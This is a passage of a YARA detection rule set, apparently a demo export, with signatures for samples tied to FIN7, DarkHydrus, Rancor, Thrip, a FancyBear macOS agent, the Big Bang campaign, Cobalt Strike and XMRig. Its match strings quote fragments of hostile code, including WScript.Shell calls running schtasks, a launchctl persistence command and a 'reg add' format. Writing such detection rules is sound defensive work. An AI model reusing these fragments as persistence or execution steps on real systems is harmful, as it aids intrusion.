      $x5 = "005c00550073006500720073005c005400450053005400410044007e0031002e005400450053005c0041007000700044006100740061005c004c006f0063" ascii
      $x6 = "6c00690063006100740069006f006e002200220029003a00650078006500630075007400650020007700700072006f0074006500630074002e0041006300" ascii
      $x7 = "7374656d33325c6d736874612e657865000023002e002e005c002e002e005c002e002e005c00570069006e0064006f00770073005c005300790073007400" ascii
      $x8 = "\\par \\tab \\tab sh.Run \"%comspec% /c tasklist >\"\"\" & tpath & \"\"\" 2>&1\", 0, true" fullword ascii
      $x9 = "00720079007b006500760061006c0028002700770061006c006c003d004700650074004f0062006a0065006300740028005c005c0027005c005c00270027" ascii
      $x10 = "006e00640079005c004400650073006b0074006f0070005c0075006e006c006f0063006b002e0064006f0063002e006c006e006b" ascii
   condition: 
      uint16 ( 0 ) == 0x5c7b and filesize < 3000KB and ( 1 of ( $x* ) or 2 of them )
} 

rule APT_FIN7_EXE_Sample_Aug18_1_RID2FE0 : APT DEMO EXE FILE G0046 RUSSIA T1136 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 12:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Manche Enterprises Limited0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of them
} 

rule APT_FIN7_EXE_Sample_Aug18_2_RID2FE1 : APT DEMO EXE FILE G0046 RUSSIA T1136 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 12:16:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "constructor or from DllMain." fullword ascii
      $s2 = "Network Software Ltd0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them
} 

rule APT_FIN7_EXE_Sample_Aug18_3_RID2FE2 : APT DEMO EXE FILE G0046 RUSSIA T1136 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 12:16:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cvzdfhtjkdhbfszngjdng" fullword ascii
      $s2 = "sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them
} 

rule APT_FIN7_EXE_Sample_Aug18_4_RID2FE3 : APT DEMO EXE FILE G0046 RUSSIA T1136 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 12:16:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "c:\\file.dat" fullword wide
      $s2 = "constructor or from DllMain." fullword ascii
      $s3 = "lineGetCallIDs" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them
} 

rule APT_FIN7_EXE_Sample_Aug18_5_RID2FE4 : APT DEMO EXE FILE G0046 RUSSIA T1136 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 12:16:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "x0=%d, y0=%d, x1=%d, y1=%d" fullword ascii
      $s3 = "sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them
} 

rule APT_FIN7_EXE_Sample_Aug18_6_RID2FE5 : APT DEMO EXE FILE G0046 RUSSIA T1136 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 12:16:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0046, RUSSIA, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s1 = "coreServiceShell.exe" fullword ascii
      $s2 = "PtSessionAgent.exe" fullword ascii
      $s3 = "TiniMetI.exe" fullword ascii
      $s4 = "PwmSvc.exe" fullword ascii
      $s5 = "uiSeAgnt.exe" fullword ascii
      $s7 = "LHOST:" fullword ascii
      $s8 = "TRANSPORT:" fullword ascii
      $s9 = "LPORT:" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( pe.exports ( "TiniStart" ) or 4 of them )
} 

rule APT_FIN7_EXE_Sample_Aug18_7_RID2FE6 : APT DEMO EXE FILE G0046 RUSSIA T1136 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 12:16:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "libpng version" fullword ascii
      $s2 = "sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them
} 

rule APT_FIN7_EXE_Sample_Aug18_8_RID2FE7 : APT DEMO EXE FILE G0046 RUSSIA T1136 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 12:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GetL3st3rr" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them
} 

rule APT_FIN7_EXE_Sample_Aug18_10_RID3010 : APT DEMO EXE FILE G0046 RUSSIA {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 12:23:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0046, RUSSIA"
      minimum_yara = "1.7"
      
   strings:
      $c1 = { 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70
               00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43
               00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74
               00 20 00 31 00 20 00 2D 00 20 00 31 00 39 00 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them
} 

rule APT_FIN7_Sample_EXE_Aug18_1_RID2FE0 : APT DEMO EXE FILE G0046 RUSSIA T1136 {
   meta:
      description = "Detects FIN7 Sample"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 12:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "x0=%d, y0=%d, x1=%d, y1=%d" fullword ascii
      $s2 = "dx=%d, dy=%d" fullword ascii
      $s3 = "Error with JP2H box size" fullword ascii
      $co1 = { 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
               00 00 00 00 00 00 00 00 00 00 00 2E 63 6F 64 65
               00 00 00 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of ( $s* ) and $co1 at 0x015D
} 

rule MAL_Unknown_Jul18_4_RID2DC0 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects strings found in malware samples"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/"
      date = "2018-07-28 10:45:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Error #bdembed1 -- Quiting" fullword ascii
      $s2 = "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s" fullword ascii
      $s3 = "\\a.txt" fullword ascii
      $s4 = "command.com" fullword ascii
      $s6 = "DFDHERGDCV" fullword ascii
      $s7 = "DFDHERGGZV" fullword ascii
      $s8 = "%s%s%s%s%s%s%s%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 5 of them
} 

rule APT_DarkHydrus_Jul18_1_RID2ED9 : APT DEMO EXE FILE G0079 MIDDLE_EAST T1136 {
   meta:
      description = "Detects strings found in malware samples in APT report in DarkHydrus"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/"
      date = "2018-07-28 11:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0079, MIDDLE_EAST, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "Z:\\devcenter\\aggressor\\" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == "d3666d1cde4790b22b44ec35976687fb" or 1 of them )
} 

rule APT_DarkHydrus_Jul18_2_RID2EDA : APT DEMO EXE FILE G0079 MIDDLE_EAST T1136 {
   meta:
      description = "Detects strings found in malware samples in APT report in DarkHydrus"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/"
      date = "2018-07-28 11:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0079, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "windir" fullword ascii
      $s6 = "temp.dll" fullword ascii
      $s7 = "libgcj-12.dll" fullword ascii
      $s8 = "%s\\System32\\%s" fullword ascii
      $s9 = "StartW" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them
} 

rule APT_DarkHydrus_Jul18_3_RID2EDB : APT DEMO EXE FILE G0079 MIDDLE_EAST T1136 {
   meta:
      description = "Detects strings found in malware samples in APT report in DarkHydrus"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/"
      date = "2018-07-28 11:32:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0079, MIDDLE_EAST, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s2 = "Ws2_32.dll" fullword ascii
      $s3 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == "478eacfbe2b201dabe63be53f34148a5" or all of them )
} 

rule HKTL_Unlicensed_CobaltStrike_EICAR_Jul18_5_RID361D : APT DEMO EXE FILE HKTL S0154 T1075 T1136 {
   meta:
      description = "Detects strings found in malware samples in APT report in DarkHydrus"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/"
      date = "2018-07-28 16:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, HKTL, S0154, T1075, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
      $s1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" fullword ascii
      $s2 = "libgcj-12.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( pe.imphash ( ) == "829da329ce140d873b4a8bde2cbfaa7e" or all of ( $s* ) or $x1 )
} 

rule HKTL_beRootexe_RID2C50 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects beRoot.exe which checks common Windows missconfigurations"
      author = "Florian Roth"
      reference = "https://github.com/AlessandroZ/BeRoot/tree/master/Windows"
      date = "2018-07-25 09:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "checks.webclient.secretsdump(" fullword ascii
      $s2 = "beroot.modules" fullword ascii
      $s3 = "beRoot.exe.manifest" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 18000KB and 1 of them )
} 

rule HKTL_beRootexe_output_RID2F60 : DEMO HKTL T1136 {
   meta:
      description = "Detects the output of beRoot.exe"
      author = "Tobias Michalski"
      reference = "https://github.com/AlessandroZ/BeRoot/tree/master/Windows"
      date = "2018-07-25 11:54:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "permissions: {'change_config'" fullword wide
      $s2 = "Full path: C:\\Windows\\system32\\msiexec.exe /V" fullword wide
      $s3 = "Full path: C:\\Windows\\system32\\svchost.exe -k DevicesFlow" fullword wide
      $s4 = "! BANG BANG !" fullword wide
   condition: 
      filesize < 400KB and 3 of them
} 

rule HKTL_EmbeddedPDF_RID2C87 : DEMO FILE HKTL T1136 {
   meta:
      description = "Detects Embedded PDFs which can start malicious content"
      author = "Tobias Michalski"
      reference = "https://twitter.com/infosecn1nja/status/1021399595899731968?s=12"
      date = "2018-07-25 09:53:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "/Type /Action\n /S /JavaScript\n /JS (this.exportDataObject({" fullword ascii
      $s1 = "(This PDF document embeds file" fullword ascii
      $s2 = "/Names << /EmbeddedFiles << /Names" fullword ascii
      $s3 = "/Type /EmbeddedFile" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5025 and 2 of ( $s* ) and $x1
} 

rule MAL_OSX_FancyBear_Agent_Jul18_1_RID31DF : DEMO FILE G0007 MACOS MAL T1136 T1152 T1159 {
   meta:
      description = "Detects FancyBear Agent for OSX"
      author = "Florian Roth"
      reference = "https://twitter.com/DrunkBinary/status/1018448895054098432"
      date = "2018-07-15 13:41:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, G0007, MACOS, MAL, T1136, T1152, T1159"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "/Users/kazak/Desktop/" ascii
      $s1 = "launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist" fullword ascii
      $s2 = "mkdir -p /Users/Shared/.local/ &> /dev/null" fullword ascii
      $s3 = "chmod 755 /Users/Shared/start.sh" fullword ascii
      $s4 = "chmod 755 %s/%s &> /dev/null" fullword ascii
      $s6 = "chmod 755 /Users/Shared/.local/kextd" fullword ascii
   condition: 
      uint16 ( 0 ) == 0xfacf and filesize < 3000KB and ( 1 of ( $x* ) and 4 of them )
} 

rule APT_ME_BigBang_Gen_Jul18_1_RID2FCC : APT DEMO EXE FILE GEN MIDDLE_EAST T1136 {
   meta:
      description = "Detects malware from Big Bang campaign against Palestinian authorities"
      author = "Florian Roth"
      reference = "https://research.checkpoint.com/apt-attack-middle-east-big-bang/"
      date = "2018-07-09 12:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, MIDDLE_EAST, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x2 = "%@W@%S@c@ri%@p@%t.S@%he@%l%@l" ascii
      $x3 = "S%@h%@e%l%@l." ascii
      $x4 = "(\"S@%t@%a%@rt%@up\")" ascii
      $x5 = "aW5zdGFsbCBwcm9nOiBwcm9nIHdpbGwgZGVsZXRlIG9sZCB0bXAgZmlsZQ==" fullword ascii
      $x6 = "aW5zdGFsbCBwcm9nOiBUaGVyZSBpcyBubyBvbGQgZmlsZSBpbiB0ZW1wLg==" fullword ascii
      $x7 = "VXBkYXRlIHByb2c6IFRoZXJlIGlzIG5vIG9sZCBmaWxlIGluIHRlbXAu" fullword ascii
      $x8 = "aW5zdGFsbCBwcm9nOiBDcmVhdGUgVGFzayBhZnRlciA1IG1pbiB0byBydW4gRmlsZSBmcm9tIHRtcA==" fullword ascii
      $x9 = "UnVuIEZpbGU6IE15IHByb2cgaXMgRXhpdC4=" fullword ascii
      $x10 = "li%@%@nk.W%@%@indo@%%@%@%wS%@%@tyle = 3" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of them or pe.imphash ( ) == "0f09ea2a68d04f331df9a5d0f8641332" )
} 

rule APT_ME_BigBang_Mal_Jul18_1_RID2FCC : APT DEMO EXE FILE MIDDLE_EAST T1136 {
   meta:
      description = "Detects malware from Big Bang report"
      author = "Florian Roth"
      reference = "https://research.checkpoint.com/apt-attack-middle-east-big-bang/"
      date = "2018-07-09 12:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%Y%m%d-%I-%M-%S" fullword ascii
      $s2 = "/api/serv/requests/%s/runfile/delete" fullword ascii
      $s3 = "\\part.txt" fullword ascii
      $s4 = "\\ALL.txt" fullword ascii
      $s5 = "\\sat.txt" fullword ascii
      $s6 = "runfile.proccess_name" fullword ascii
      $s7 = "%s%s%p%s%zd%s%d%s%s%s%s%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 4 of them
} 

rule PUA_LNX_XMRIG_CryptoMiner_RID3009 : DEMO FILE LINUX MAL T1136 {
   meta:
      description = "Detects XMRIG CryptoMiner software"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-06-28 12:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, LINUX, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "--multihash-factor=N              number of hash blocks to process at a time (don't set or 0 enables automatic selection o" fullword ascii
      $s2 = "* COMMANDS:     'h' hashrate, 'p' pause, 'r' resume, 'q' shutdown" fullword ascii
      $s3 = "* THREADS:      %d, %s, aes=%d, hf=%zu, %sdonate=%d%%" fullword ascii
      $s4 = ".nicehash.com" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 8000KB and ( 1 of ( $x* ) or 2 of them )
} 

rule APT_RANCOR_JS_Malware_RID2E3E : APT DEMO FILE G0075 MAL T1053 T1136 {
   meta:
      description = "Detects Rancor Malware"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
      date = "2018-06-26 11:06:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0075, MAL, T1053, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ",0,0 >%SystemRoot%\\system32\\spool\\drivers\\color\\fb.vbs\",0,0" fullword ascii
      $x2 = "CreateObject(\"Wscript.Shell\").Run \"explorer.exe \"\"http" ascii
      $x3 = "CreateObject(\"Wscript.Shell\").Run \"schtasks /create" ascii
   condition: 
      uint16 ( 0 ) == 0x533c and filesize < 1KB and 1 of them
} 

rule APT_RANCOR_PLAINTEE_Variant_RID2FFF : APT DEMO EXE FILE G0075 T1112 T1136 {
   meta:
      description = "Detects PLAINTEE malware"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
      date = "2018-06-26 12:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0075, T1112, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "payload.dat" fullword ascii
      $s3 = "temp_microsoft_test.txt" fullword ascii
      $s4 = "reg add %s /v %s /t REG_SZ /d \"%s\"" fullword ascii
      $s6 = "%s %s,helloworld2" fullword ascii
      $s9 = "%s \\\"%s\\\",helloworld" fullword ascii
      $s16 = "recv plugin type %s size:%d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them
} 

rule APT_RANCOR_PLAINTEE_Malware_Exports_RID3347 : APT DEMO EXE FILE G0075 MAL {
   meta:
      description = "Detects PLAINTEE malware"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
      date = "2018-06-26 14:41:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0075, MAL"
      required_modules = "pe"
      minimum_yara = "3.6.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and pe.exports ( "Add" ) and pe.exports ( "Sub" ) and pe.exports ( "DllEntryPoint" ) and pe.number_of_exports == 3
} 

rule APT_RANCOR_DDKONG_Malware_Exports_RID32AC : APT DEMO EXE FILE G0075 MAL {
   meta:
      description = "Detects DDKONG malware"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
      date = "2018-06-26 14:15:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0075, MAL"
      required_modules = "pe"
      minimum_yara = "3.6.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and pe.exports ( "ServiceMain" ) and pe.exports ( "Rundll32Call" ) and pe.exports ( "DllEntryPoint" ) and pe.number_of_exports == 3
} 

rule APT_Thrip_Sample_Jun18_1_RID2FA2 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:05:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "idocback.dll" fullword ascii
      $s2 = "constructor or from DllMain." fullword ascii
      $s3 = "appmgmt" fullword ascii
      $s4 = "chksrv" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule APT_Thrip_Sample_Jun18_2_RID2FA3 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:05:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\WINDOWS\\system32\\sysprep\\cryptbase.dll" fullword ascii
      $s2 = "ProbeScriptFint" fullword wide
      $s3 = "C:\\WINDOWS\\system32\\cmd.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them
} 

rule APT_Thrip_Sample_Jun18_3_RID2FA4 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:05:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\Windows\\SysNative\\cmd.exe" fullword ascii
      $s2 = "C:\\Windows\\SysNative\\sysprep\\cryptbase.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them
} 

rule APT_Thrip_Sample_Jun18_4_RID2FA5 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:06:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\system32\\wbem\\tmf\\caches_version.db" fullword ascii
      $s2 = "ProcessName No Access" fullword ascii
      $s3 = "Hwnd of Process NULL" fullword ascii
      $s4 = "*********The new session is be opening:(%d)**********" fullword ascii
      $s5 = "[EXECUTE]" fullword ascii
      $s6 = "/------------------------------------------------------------------------" fullword ascii
      $s7 = "constructor or from DllMain." fullword ascii
      $s8 = "Time:%d-%d-%d %d:%d:%d" fullword ascii
      $s9 = "\\info.config" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 5 of them
} 

rule APT_Thrip_Sample_Jun18_5_RID2FA6 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:06:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "c:\\windows\\USBEvent.exe" fullword ascii
      $s5 = "c:\\windows\\spdir.dat" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

